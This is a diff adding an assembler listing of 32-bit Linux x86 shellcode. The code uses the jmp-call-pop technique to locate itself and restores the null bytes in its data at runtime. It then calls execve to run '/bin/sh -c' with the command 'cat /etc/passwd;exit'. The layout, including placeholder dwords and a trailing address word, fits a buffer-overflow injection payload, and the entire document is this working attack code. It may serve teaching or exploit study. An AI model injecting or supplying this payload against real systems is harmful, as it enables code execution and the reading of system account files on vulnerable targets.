@@ -1,0 +1,38 @@
+     1                                              bits 32
+     2                                              ; find out where we are
+     3 00000000 EB29                    start:      jmp short codeEnd
+     4 00000002 5E                      start2:     pop esi
+     5                                  
+     6                                              ; restore null bytes in data  
+     7 00000003 31C0                                xor eax, eax
+     8 00000005 884608                              mov [byte esi+flagStr-exeStr-1],al    
+     9 00000008 88460B                              mov [byte esi+cmdStr-exeStr-1],al
+    10 0000000B 884620                              mov [byte esi+arrayAddr-exeStr-1],al
+    11 0000000E 89462D                              mov [byte esi+arrayAddr-exeStr+12],eax
+    12                                  
+    13 00000011 897621                              mov [byte esi+arrayAddr-exeStr], esi
+    14 00000014 8D7E09                              lea edi, [byte esi+flagStr-exeStr]
+    15 00000017 897E25                              mov [byte esi+arrayAddr-exeStr+4], edi
+    16 0000001A 8D7E0C                              lea edi, [byte esi+cmdStr-exeStr]
+    17 0000001D 897E29                              mov [byte esi+arrayAddr-exeStr+8],edi
+    18                                  
+    19                                              ; setup registers and make system call.         
+    20 00000020 B00B                                mov al,0x0b
+    21 00000022 89F3                                mov ebx,esi
+    22 00000024 8D4E21                              lea ecx,[byte esi+arrayAddr-exeStr]
+    23 00000027 31D2                                xor edx,edx
+    24 00000029 CD80                                int 0x80
+    25 0000002B E8D2FFFFFF              codeEnd:    call start2
+    26                                  
+    27                                              ; data
+    28 00000030 2F62696E2F73685879      exeStr:     db "/bin/shXy"
+    29 00000039 2D6358                  flagStr:    db "-cX"
+    30 0000003C 636174202F6574632F-     cmdStr:     db "cat /etc/passwd;exitX"
+    31 00000045 7061737377643B6578-
+    32 0000004E 697458             
+    33 00000051 FFFFFFFF                arrayAddr:  dd 0xffffffff
+    34 00000055 FFFFFFFF                            dd 0xffffffff
+    35 00000059 FFFFFFFF                            dd 0xffffffff
+    36 0000005D FFFFFFFF                            dd 0xffffffff
+    37                                  
+    38 00000061 61000000                newAddr:    dd newAddr-start
